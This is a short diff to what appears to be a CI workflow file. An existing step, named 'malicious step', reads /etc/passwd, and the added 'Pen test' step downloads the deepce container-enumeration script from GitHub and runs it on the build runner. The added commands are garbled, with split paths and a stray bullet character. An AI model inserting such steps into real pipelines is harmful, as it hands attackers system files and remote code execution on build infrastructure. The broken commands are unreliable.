@@ -38,4 +38,10 @@ jobs:
       - name: malicious step
         run: |
           echo "pwned" && cat /etc/passwd
+          
+      - name: Pen test
+        run: |
+          cd / tmp; \
+          wget https://github.com/stealthcopter/deepce/raw/master/deepce.sh; \ chmod +x ./deepce.sh; \
+          • /deepce.sh
 
